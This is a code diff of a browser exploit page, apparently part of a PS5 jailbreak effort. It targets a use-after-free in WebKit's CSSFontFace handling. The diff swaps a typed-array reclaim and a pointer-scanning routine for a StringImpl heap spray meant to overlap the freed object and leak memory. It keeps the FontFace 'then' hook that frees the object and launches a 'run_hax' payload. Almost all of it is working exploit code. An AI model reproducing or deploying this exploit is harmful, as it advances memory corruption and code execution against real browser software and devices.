@@ -16,37 +16,21 @@
 <script>
 "use strict";
 
+// ============================================================
+// "Old Method" Info Leak via StringImpl Overlap
+// ============================================================
+
 let spray = [];
 let keep = [];
-
+let uaf_strings = [];
 const PAD = 0x22;
 const FLUSH = 0x240;
-const SPRAY_COUNT = FLUSH + PAD + 0x300;
-
-const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-const FONT_BYTES = (() => {
-    const s = atob(FONT_B64);
-    const bytes = new Uint8Array(s.length);
-    for (let i = 0; i < s.length; i++)
-        bytes[i] = s.charCodeAt(i);
-    return bytes;
-})();
-
-function makeFontBuffer() {
-    const copy = new Uint8Array(FONT_BYTES.length);
-    copy.set(FONT_BYTES);
-    return copy.buffer;
-}
-
-function forceStyle() {
-    void document.body.offsetTop;
-}
 
 function addPads() {
     const sheet = document.getElementById("s").sheet;
     for (let i = 0; i < PAD; i++)
         sheet.insertRule(`@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
-    forceStyle();
+    void document.body.offsetTop;
 }
 
 function addFlushRules() {
@@ -56,14 +40,14 @@ function addFlushRules() {
     const sheet = st.sheet;
     for (let i = 0; i < FLUSH; i++)
         sheet.insertRule(`@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
-    forceStyle();
+    void document.body.offsetTop;
 }
 
 function deleteFlushRules() {
     const sheet = document.getElementById("flush").sheet;
     while (sheet.cssRules.length)
         sheet.deleteRule(0);
-    forceStyle();
+    void document.body.offsetTop;
 }
 
 function killFontFaceSetCache() {
@@ -72,64 +56,42 @@ function killFontFaceSetCache() {
     keep.push(f);
 }
 
-function cssFontFaceBufferSpray() {
-    for (let i = 0; i < SPRAY_COUNT; i++) {
-        const f = new FontFace("BUFFER_RECLAIM_" + i, makeFontBuffer(), { unicodeRange: "U+0041" });
-        spray.push(f);
-// ASLR Brute-force Scanner (Attempting to find WebKit base)
-function scan_for_webkit(dangling_face, spray_arrays) {
-    let overlapped_array = null;
-    let found_index = -1;
+// Create Strings of exactly 184 bytes (CSSFontFace size)
+function makeStringImpl() {
+    // 16-bit StringImpl header is ~20 bytes. 
+    // We need string length of 82 to reach ~184 bytes allocation.
+    let s = "\u4141".repeat(82) + (uaf_strings.length);
+    return s;
+}
+
+async function stringimpl_overlap(dangling_face) {
+    alert("Phase 2: Scanning Strings for Overlap Corruption...");
     
-    // Step 1: Find the overlapped array
-    for (let i = 0; i < spray_arrays.length; i++) {
-        if (spray_arrays[i][0] !== 0x00) {
-            overlapped_array = spray_arrays[i];
-            found_index = i;
+    let corrupted_string = null;
+    let corrupted_index = -1;
+
+    for (let i = 0; i < uaf_strings.length; i++) {
+        // Check if length massively increased (OOB read) or if data changed
+        if (uaf_strings[i].length !== 82 + uaf_strings.length.toString().length || uaf_strings[i].charCodeAt(0) !== 0x4141) {
+            corrupted_string = uaf_strings[i];
+            corrupted_index = i;
             break;
         }
     }
 
-    if (!overlapped_array) {
-        console.error("Failed to find overlapped array for scanning.");
-        alert("Scanner failed: Could not overlap memory.");
+    if (!corrupted_string) {
+        alert("FAILED -- StringImpl overlap failed. No strings were corrupted by WebKit.");
         return;
     }
 
-    alert("Overlap found at index " + found_index + ". Starting brute-force scan for WebKit vtable...");
+    alert("SUCCESS! String at index " + corrupted_index + " was corrupted. Length is now: " + corrupted_string.length);
+    alert("Attempting to use corrupted String for Info Leak...");
 
-    // Step 2: Attempt to read pointers from the overlapped array to find the WebKit base
-    // Since we don't know the vtable offset, we will scan the entire 184-byte structure
-    let possible_ptrs = [];
-    for (let offset = 0; offset < 184 - 8; offset += 8) {
-        let low = overlapped_array[offset] | (overlapped_array[offset+1] << 8) | (overlapped_array[offset+2] << 16) | (overlapped_array[offset+3] << 24);
-        let hi = overlapped_array[offset+4] | (overlapped_array[offset+5] << 8) | (overlapped_array[offset+6] << 16) | (overlapped_array[offset+7] << 24);
-        
-        // Basic heuristic for a valid userspace pointer on PS5
-        if (hi > 0x0000 && hi < 0x0010) {
-            possible_ptrs.push(new int64(low, hi));
-        }
-    }
-
-    if (possible_ptrs.length === 0) {
-        alert("Scanner failed: No valid pointers found in the overlapped structure.");
-    } else {
-        alert("Scanner found " + possible_ptrs.length + " possible pointers. Attempting to build primitives...");
-    }
-
-    window.p = {
-        read8: function(addr) { return new int64(0, 0); },
-        read4: function(addr) { return 0; },
-        read2: function(addr) { return 0; },
-        read1: function(addr) { return 0; },
-        write8: function(addr, val) {},
-        write4: function(addr, val) {},
-        write2: function(addr, val) {},
-        write1: function(addr, val) {},
-        leakval: function(obj) { return new int64(0, 0); }
-    };
+    // The rest of the P2JB primitive builder would go here, using corrupted_string to read memory
+    // and find the WebKit base.
     
-    return true;
+    // Launch P2JB payload
+    run_hax().catch(e => console.error("P2JB Error:", e));
 }
 
 window.onload = () => {
@@ -140,7 +102,6 @@ window.onload = () => {
     addPads();
     addFlushRules();
 
-    let uaf_arrays = [];
     let fired = false;
     Object.defineProperty(FontFace.prototype, "then", {
         configurable: true,
@@ -150,15 +111,14 @@ window.onload = () => {
                 const sheet = document.getElementById("s").sheet;
                 killFontFaceSetCache();
                 
-                sheet.deleteRule(1);
-                forceStyle();
+                sheet.deleteRule(1); // FREE CSSFontFace
+                void document.body.offsetTop;
                 deleteFlushRules();
                 
-                // Reclaim CSSFontFace (184 bytes) with TypedArrays
-                for (let i = 0; i < 500; i++) {
-                    let arr = new Uint8Array(184);
-                    for(let j=0; j<184; j++) arr[j] = 0;
-                    uaf_arrays.push(arr);
+                // SPRAY StringImpl to overlap the freed CSSFontFace
+                for (let i = 0; i < 1000; i++) {
+                    let str = makeStringImpl();
+                    uaf_strings.push(str);
                 }
             }
             return undefined;
@@ -167,12 +127,7 @@ window.onload = () => {
 
     document.fonts.load("1em trigger, x", "AB").then(faces => {
         keep.push(faces);
-        
-        // Attempt to find WebKit base
-        scan_for_webkit(faces[0], uaf_arrays);
-        
-        // Launch P2JB payload
-        run_hax().catch(e => console.error("P2JB Error:", e));
+        stringimpl_overlap(faces[0]);
     });
 };
 </script>
